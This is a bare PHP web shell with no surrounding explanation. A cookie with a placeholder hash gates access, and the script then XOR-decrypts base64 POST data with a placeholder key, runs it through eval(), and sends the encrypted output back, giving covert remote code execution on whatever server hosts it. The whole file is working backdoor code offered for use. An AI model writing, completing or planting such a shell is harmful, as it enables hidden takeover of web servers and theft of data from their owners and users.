
<?php 
if (isset($_POST['data'])) {
    if ($_COOKIE['auth_token']=='<HASH>')
    {
        $data = base64_decode($_POST['data']);
        $key = '<KEY>';
        $decoded_data = '';
        for ($i = 0; $i < strlen($data); $i++) {
            $decoded_data .= $data[$i] ^ $key[$i % strlen($key)];
        }
        ob_start(); // Start output buffering
        eval($decoded_data);
        $result = ob_get_clean(); // Get the output and clean the buffer
        $cyphered_data = '';
        for ($i = 0; $i < strlen($result); $i++) {
            $cyphered_data .= $result[$i] ^ $key[$i % strlen($key)];
        }
        $encoded_result = base64_encode($cyphered_data);
        echo $encoded_result; // Echo the encoded result back to the client
    }
    else {
    http_response_code(403);
    }
}
?>
